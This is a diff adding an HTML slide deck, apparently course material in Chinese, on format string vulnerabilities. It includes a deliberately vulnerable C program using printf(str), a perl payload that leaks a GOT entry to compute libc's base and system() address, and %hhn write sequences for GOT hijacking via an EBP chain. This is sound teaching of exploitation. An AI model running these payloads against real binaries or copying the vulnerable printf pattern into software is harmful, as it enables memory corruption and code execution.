@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="generator" content="pandoc">
+  <title>Format String Vulnerability</title>
+  <meta name="apple-mobile-web-app-capable" content="yes" />
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <link rel="stylesheet" href="reveal.js/lib/css/tomorrow-night-bright.css">
+  <link rel="stylesheet" href="reveal.js/css/reveal.min.css"/>
+    <style type="text/css">code{white-space: pre;}</style>
+    <link rel="stylesheet" href="reveal.js/css/theme/simple.css" id="theme">
+  <link rel="stylesheet" media="print" href="reveal.js/css/print/pdf.css" />
+  <!--[if lt IE 9]>
+  <script src="reveal.js/lib/js/html5shiv.js"></script>
+  <![endif]-->
+</head>
+<body>
+  <div class="reveal">
+    <div class="slides">
+
+<section>
+    <h1 class="title">Format String Vulnerability</h1>
+    <h3 class="date"></h3>
+</section>
+
+<section><section id="source-code" class="titleslide slide level1"><h1>Source code</h1></section><section id="section" class="slide level2">
+<h1></h1>
+<p><a href="w4.tar.gz">Source code</a></p>
+</section></section>
+<section><section id="format-string" class="titleslide slide level1"><h1>Format String</h1></section><section id="format-string-1" class="slide level2">
+<h1>Format String</h1>
+<ul>
+<li>在輸出函式或字串處理函式中用來表示輸出的字串格式</li>
+</ul>
+<pre class="cpp"><code>printf(&quot;%s %d\n&quot;, str, a);
+fprintf(stderr, &quot;%s %d\n&quot;, str, a);
+sprintf(buffer, &quot;%s %d\n&quot;, str, a);</code></pre>
+</section><section id="錯誤的使用方式" class="slide level2">
+<h1>錯誤的使用方式</h1>
+<p style="margin:1em;font-size:1.2em">
+<code>printf(str);</code>
+</p>
+
+<p style="text-align:left">
+一般正常輸入時會直接印出原字串，但 <code>str</code> 會被做為格式字串解析， 故若輸入內容包含 <code>%x</code>, <code>%d</code> 等格式字串，就會造成資訊的洩漏。
+</p>
+
+</section><section id="section-1" class="slide level2">
+<h1></h1>
+<figure>
+<img src="fmt_cve.png" />
+</figure>
+</section><section id="例子" class="slide level2">
+<h1>例子</h1>
+<pre class="cpp"><code>#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdlib.h&gt;
+
+void main() {
+  char str[100];
+  while(fgets(str, sizeof(str), stdin)) {
+    if (strcmp(str, &quot;exit\n&quot;)==0) {
+      break;
+    }
+    printf(str);
+    fflush(stdout);
+  }
+  exit(0);
+}</code></pre>
+</section><section id="進階格式字串用法" class="slide level2">
+<h1>進階格式字串用法</h1>
+<ul>
+<li><code>%x</code>, <code>%d</code>, <code>%c</code>, <code>%s</code> <br>印出 16 進制整數、整數、字元、指標指向的字串</li>
+<li><code>%10$x</code> <br> 印出第 10 個參數的值，實際上是印出 <code>DWORD [esp+40]</code> 的內容</li>
+</ul>
+</section><section id="section-2" class="slide level2">
+<h1></h1>
+<figure>
+<img src="fmt_stk.png" />
+</figure>
+</section><section id="用來洩漏各種資訊" class="slide level2">
+<h1>用來洩漏各種資訊</h1>
+<ul>
+<li>堆疊上會跟堆疊位置有關的變數，且因為堆疊上的區域變數位置都是相對的，只要洩漏其中一個就可以推算其它變數的位置</li>
+<li>例如 <code>push ebp</code> 使得 <code>ebp</code> 的內容被存放在堆疊上</li>
+<li>假如 shellcode 是在區域變數，可以用來推算它的位置，溢出後可以直接跳到正確位置上</li>
+</ul>
+</section><section id="洩漏-stackguard-canary" class="slide level2">
+<h1>洩漏 StackGuard Canary</h1>
+<ul>
+<li>利用格式字串洩漏 canary 的值，在溢出時就可以直接寫上正確的值，繞過 stack checking</li>
+</ul>
+</section><section id="任意位址讀取" class="slide level2">
+<h1>任意位址讀取</h1>
+<ul>
+<li>若格式字串位於堆疊上，可以利用 <code>%s</code> 讀取記憶體中任意位址的內容</li>
+<li>構造適當的輸入，將要讀取的位址做為參數傳遞給 <code>%s</code>，就可以做為字串印出目標的內容</li>
+</ul>
+</section><section id="洩漏函式庫位址" class="slide level2">
+<h1>洩漏函式庫位址</h1>
+<ul>
+<li>共享函式庫因為 ASLR，每次的位址不固定，因此沒辦法利用裡面的其它函式 (例如: <code>system()</code>)</li>
+<li>洩漏出一個函式在被載入的函式庫裡的位址後，就可以推算其它函式的位置</li>
+</ul>
+</section><section id="例子-1" class="slide level2">
+<h1>例子</h1>
+<pre class="no-highlight"><code>08048380 &lt;printf@plt&gt;:
+ 8048380:  ff 25 10 a0 04 08     jmp    DWORD PTR ds:0x804a010
+ 8048386:  68 08 00 00 00        push   0x8</code></pre>
+<ul>
+<li><code>printf</code> 的 got 欄位位址為 <code>0x804a010</code></li>
+<li>洩漏這個位址的內容...</li>
+</ul>
+</section><section id="section-3" class="slide level2">
+<h1></h1>
+<pre class="bash"><code>perl -e &#39;print &quot;\x10\xA0\x04\x08%6\$s\nexit\n&quot;&#39; | ./fmt | xxd</code></pre>
+<pre class="no-highlight"><code>0000000: 10a0 0408 b01b 62f7 5089 63f7 a683 0408  
+0000010: b683 0408 70e9 5ef7 0a                   </code></pre>
+<ul>
+<li>在記憶體裡的位置為 <code>0xf7621bb0</code></li>
+<li>在函式庫中，不加上 ASLR 基底的位址為 <code>0x0004cbb0</code> <br> (由 <code>readelf</code> 取得)</li>
+<li>相減後得到此函式庫被載入的基底位址是 <br> <code>0xf7621bb0 - 0x0004cbb0 = 0xf75d5000</code></li>
+</ul>
+</section><section id="利用函式庫裡其它函式" class="slide level2">
+<h1>利用函式庫裡其它函式</h1>
+<ul>
+<li>由 readelf 取得 <code>system()</code> 的位址是 <code>0x0003fc40</code>，加上 ASLR 基底 <code>0xf75d5000</code> 為 <code>0xf7614c40</code></li>
+<li>如果有溢出漏洞可以覆寫返回地址，就可以直接返回到 <code>system(&quot;/bin/sh&quot;)</code></li>
+<li>但必需自行疊好要傳入的參數 (Ref. ROP)</li>
+</ul>
+</section><section id="更進階格式字串用法" class="slide level2">
+<h1>更進階格式字串用法</h1>
+<ul>
+<li><code>printf</code> 不止可以用來讀記憶體 (取出變數值然後輸出)，還可以寫入</li>
+<li><code>%n</code> 寫入「目前已經輸出幾個字元」到對應參數所指的位址</li>
+<li><code>%n</code> 寫入 DWORD，<code>%hn</code>、<code>%hhn</code> 寫入 WORD 和 BYTE</li>
+</ul>
+</section><section id="例子-2" class="slide level2">
+<h1>例子</h1>
+<pre class="cpp"><code>#include &lt;stdio.h&gt;
+
+void main(){
+  int a1, a2, a3, a4;
+  printf(&quot;AAAABBBB%n\n&quot;, &amp;a1);
+  printf(&quot;%d%n\n&quot;, a1, &amp;a2);
+  printf(&quot;%100c%n\n&quot;, a1, &amp;a3);
+  printf(&quot;%08x %1$n %d\n&quot;, &amp;a4, a3);
+
+  printf(&quot;\n%d %d %d %d\n&quot;, a1, a2, a3, a4);
+}</code></pre>
+<p>執行結果: <code>a1=8, a2=1, a3=100, a4=9</code></p>
+</section><section id="任意位址寫入" class="slide level2">
+<h1>任意位址寫入</h1>
+<ul>
+<li>若格式字串位於堆疊上，可以利用 <code>%n</code> 對記憶體中任意位址寫入資料</li>
+<li>類似任意讀取時的作法，一樣可以將要寫入的目標位址放在堆疊上</li>
+<li>利用 <code>%123c</code> 這樣的格式字串控制輸出的長度</li>
+<li>再使用 <code>%hhn</code>，可以寫入一個 byte 到目標位址</li>
+</ul>
+</section><section id="控制寫入數值" class="slide level2">
+<h1>控制寫入數值</h1>
+<ul>
+<li>要用 <code>%n</code> 直接寫入一個 32-bit 位址不太可能，因為要輸出的長度太長了</li>
+<li>改用 <code>%hhn</code> 分 4 次寫入，把每次要寫入的位址依序放在堆疊上，一次最多只要輸出 256 個字元</li>
+<li>例如 <code>%100c%10$hhn%200c%11$hhn</code>
+<ul>
+<li>第一次寫入 <code>100 = 0x64</code></li>
+<li>第二次寫入 <code>(100 + 200) % 256 = 0x2c</code></li>
+</ul></li>
+</ul>
+</section><section id="got-hijack" class="slide level2">
+<h1>GOT Hijack</h1>
+<ul>
+<li>呼叫函式庫中的函式，必須要透過查詢 GOT 來找出要跳轉的位址</li>
+<li>如果改掉 GOT 上面的內容，在程式呼叫函式時就可以控制程式的行為</li>
+<li>善用原本就有的參數</li>
+</ul>
+</section><section id="section-4" class="slide level2">
+<h1></h1>
+<figure>
+<img src="got_hijack.png" />
+</figure>
+</section><section id="例子-3" class="slide level2">
+<h1>例子</h1>
+<pre class="cpp"><code>#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdlib.h&gt;
+
+void main() {
+  char str[100];
+  while(fgets(str, sizeof(str), stdin)) {
+    if (strcmp(str, &quot;exit\n&quot;)==0) {
+      break;
+    }
+    printf(str);
+    fflush(stdout);
+  }
+  exit(0);
+}</code></pre>
+</section><section id="其它格式化函式" class="slide level2">
+<h1>其它格式化函式</h1>
+<ul>
+<li><code>fprintf</code> — 同 <code>printf</code></li>
+<li><code>sprintf</code> — 輸出到字串裡，基本上跟 <code>printf</code> 相同，但要注意如果造成溢出則很有可能會 crash</li>
+<li><code>snprintf</code> — 有長度限制的 <code>sprintf</code> 版本，有了長度限制無法造成溢出，但不會影響 <code>%n</code> 的計算，就算構造的輸出超過限制也會被填入正確的數值。</li>
+</ul>
+</section><section id="堆疊內容不可控" class="slide level2">
+<h1>堆疊內容不可控</h1>
+<ul>
+<li>格式字串本身不在堆疊上 (可能在全域變數)，也沒有其它輸入是在區域變數</li>
+<li>這樣就無法將 <code>%s</code> 或 <code>%n</code> 所需的位址放在堆疊裡，無法任意讀取或寫入</li>
+<li>但仍然可以將堆疊上的值做為讀取或寫入的目標地址</li>
+</ul>
+</section><section id="ebp-chain" class="slide level2">
+<h1>EBP Chain</h1>
+<ul>
+<li><code>push ebp; mov ebp, esp</code> 使得堆疊上存放的 <code>ebp</code> 值，恰好指向下一個 (caller) 存放位址</li>
+</ul>
+</section><section id="section-5" class="slide level2">
+<h1></h1>
+<figure>
+<img src="ebp-chain.png" />
+</figure>
+</section><section id="利用-ebp-chain-控制堆疊內容" class="slide level2">
+<h1>利用 EBP Chain 控制堆疊內容</h1>
+<ul>
+<li><code>ebp2</code> 被存放在堆疊上，利用這個值，<code>ebp2</code> 所指的內容是可以控制的 (1 byte)</li>
+<li><code>ebp2</code> 指向 <code>ebp1</code> 所在位置的最低位，控制最低位將得到堆疊上的一個範圍 (256 bytes)</li>
+<li>在利用 <code>ebp1</code> 的值，就可以對堆疊上的一段範圍任意寫入，寫出 4 bytes 的目標位址，就可以對任意位址讀寫</li>
+</ul>
+</section>
+<section data-transition="none" class="slide level2">
+<h1>
+例子
+</h1>
+
+<pre class="no-highlight"><code>ebp = 0xffffdbd8  target_address = 0x0804a010
+0xffffdbd8:     0xffffdbe8    10$ 
+0xffffdbe8:     0xffffdbf8    14$ 
+0xffffdbf8:                   18$ </code></pre>
+<ol type="1">
+<li><code>&quot;%16c%14$hhn&quot;</code> 在 <code>0xffffdbf8</code> 寫入 <code>0x10</code>
+<li style="visibility:hidden;">
+padding
+</li>
+</li>
+</ol>
+</section>
+<section data-transition="none" class="slide level2">
+<h1>
+例子
+</h1>
+
+<pre class="no-highlight"><code>ebp = 0xffffdbd8  target_address = 0x0804a010
+0xffffdbd8:     0xffffdbe8    10$ 
+0xffffdbe8:     0xffffdbf8    14$ 
+0xffffdbf8:           0x10    18$  </code></pre>
+<ol start="2" type="1">
+<li><code>&quot;%249c%10$hhn&quot;</code> 使得 <code>0xffffdbf8</code> → <code>0xffffdbf9</code></li>
+<li><code>&quot;%160c%14$hhn&quot;</code> 在 <code>0xffffdbf9</code> 寫入 <code>0xa0</code></li>
+</ol>
+</section>
+<section data-transition="none" class="slide level2">
+<h1>
+例子
+</h1>
+
+<pre class="no-highlight"><code>ebp = 0xffffdbd8  target_address = 0x0804a010
+0xffffdbd8:     0xffffdbe8    10$ 
+0xffffdbe8:     0xffffdbf9    14$ 
+0xffffdbf8:         0xa010    18$  </code></pre>
+<ol start="4" type="1">
+<li><code>&quot;%250c%10$hhn&quot;</code> 使得 <code>0xffffdbf9</code> → <code>0xffffdbfa</code></li>
+<li><code>&quot;%4c%14$hhn&quot;</code> 在 <code>0xffffdbfa</code> 寫入 <code>0x04</code></li>
+</ol>
+</section>
+<section data-transition="none" class="slide level2">
+<h1>
+例子
+</h1>
+
+<pre class="no-highlight"><code>ebp = 0xffffdbd8  target_address = 0x0804a010
+0xffffdbd8:     0xffffdbe8    10$ 
+0xffffdbe8:     0xffffdbfa    14$ 
+0xffffdbf8:       0x04a010    18$  </code></pre>
+<ol start="6" type="1">
+<li><code>&quot;%251c%10$hhn&quot;</code> 使得 <code>0xffffdbfa</code> → <code>0xffffdbfb</code></li>
+<li><code>&quot;%8c%14$hhn&quot;</code> 在 <code>0xffffdbfb</code> 寫入 <code>0x08</code></li>
+</ol>
+</section>
+<section data-transition="none" class="slide level2">
+<h1>
+例子
+</h1>
+
+<pre class="no-highlight"><code>ebp = 0xffffdbd8  target_address = 0x0804a010
+0xffffdbd8:     0xffffdbe8    10$ 
+0xffffdbe8:     0xffffdbfb    14$ 
+0xffffdbf8:     0x0804a010    18$  </code></pre>
+<ol start="8" type="1">
+<li><code>&quot;%18$hhn&quot;</code> 可以讀取或寫入在 <code>0x0804a010</code> 處的內容
+<li style="visibility:hidden;">
+padding
+</li>
+
+
+
+
+
+
+
+
+
+</li>
+</ol>
+</section></section>
+    </div>
+  </div>
+
+  <script src="reveal.js/lib/js/head.min.js"></script>
+  <script src="reveal.js/js/reveal.min.js"></script>
+
+  <script>
+
+      // Full list of configuration options available here:
+      // https://github.com/hakimel/reveal.js#configuration
+      Reveal.initialize({
+        controls: true,
+        progress: true,
+        history: true,
+        center: true,
+        theme: 'my', // available themes are in /css/theme
+        transition: 'linear', // default/cube/page/concave/zoom/linear/fade/none
+
+        // Optional libraries used to extend on reveal.js
+        dependencies: [
+          { src: 'reveal.js/lib/js/classList.js', condition: function() { return !document.body.classList; } },
+          { src: 'reveal.js/plugin/highlight/highlight.js', async: true, callback: function() { hljs.initHighlightingOnLoad(); } },
+          { src: 'reveal.js/plugin/zoom-js/zoom.js', async: true, condition: function() { return !!document.body.classList; } },
+          { src: 'reveal.js/plugin/notes/notes.js', async: true, condition: function() { return !!document.body.classList; } },
+//          { src: 'reveal.js/plugin/search/search.js', async: true, condition: function() { return !!document.body.classList; }, }
+//          { src: 'reveal.js/plugin/remotes/remotes.js', async: true, condition: function() { return !!document.body.classList; } }
+]});
+    </script>
+  </body>
+</html>
